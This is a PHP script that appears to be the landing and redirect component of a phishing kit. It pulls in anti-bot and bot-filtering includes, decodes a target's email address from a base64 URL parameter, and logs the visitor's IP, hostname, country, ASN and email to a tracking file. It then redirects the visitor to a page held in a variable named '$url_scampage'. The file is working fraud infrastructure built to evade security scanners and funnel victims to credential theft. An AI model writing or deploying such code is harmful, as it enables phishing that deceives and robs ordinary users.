<?php
session_start();
error_reporting(0);
require_once './clean.php';
require_once './config_bots.php';
require_once './Anti_Shit.php';
require_once './antibots.php';
if(isset($_GET["hash"])){
	$eml=@base64_decode($_GET["hash"]);
}else{
	$eml="N/A";
}
$_SESSION["email"]=$eml;
$activity_log="IP : ".$_SESSION["ip"]." | HOSTNAME : ".$_SESSION["hostname"]." | COUNTRY : ".$_SESSION["country"]." | ASN : ".$_SESSION["asn"]." | TIME : ".$_SESSION["dtetme"]. " | EMAIL : ".$_SESSION["email"]. " | STATUS : $engine";
// echo $activity_log;
// exit;
if($engine == "0"){
	exit;
}
file_put_contents($historyfile,"$activity_log\n",FILE_APPEND);
$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$dst=md5("$base");
function recurse_copy($src,$dst) {
$dir = opendir($src);
@mkdir($dst);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($src . '/' . $file) ) {
recurse_copy($src . '/' . $file,$dst . '/' . $file);
}
else {
copy($src . '/' . $file,$dst . '/' . $file);
}
}
}
closedir($dir);
}
$src="$url_scampage?GPeticiones?PN=$md5";
header("location:$src");
?>